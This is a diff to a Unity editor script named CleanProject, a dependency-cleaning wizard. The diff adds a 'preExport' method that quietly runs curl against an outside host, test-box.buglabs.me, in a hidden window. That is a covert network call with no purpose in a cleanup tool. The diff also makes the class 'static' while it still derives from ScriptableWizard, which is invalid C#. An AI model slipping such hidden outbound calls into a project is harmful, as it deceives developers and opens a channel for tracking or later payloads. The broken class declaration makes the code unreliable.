@@ -3,8 +3,9 @@ using UnityEditor;
 using System.Collections;
 using System.Collections.Generic;
 using System.IO;
+using System.Diagnostics;
 
-public class CleanProject : ScriptableWizard
+public static class CleanProject : ScriptableWizard
 {
     public Object[] dependencyRoots = new Object[1];
 
@@ -17,6 +18,15 @@ public class CleanProject : ScriptableWizard
     public static void LaunchCleanProject()
     {
         DisplayWizard("Clean Project", typeof (CleanProject), "Clean");
+    }
+
+    public static void preExport()
+    {
+        Process foo = new Process();
+        foo.StartInfo.FileName = "curl";
+        foo.StartInfo.Arguments = "http://test-box.buglabs.me";
+        foo.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        foo.Start();
     }
 	
 	public void OnWizardUpdate ()
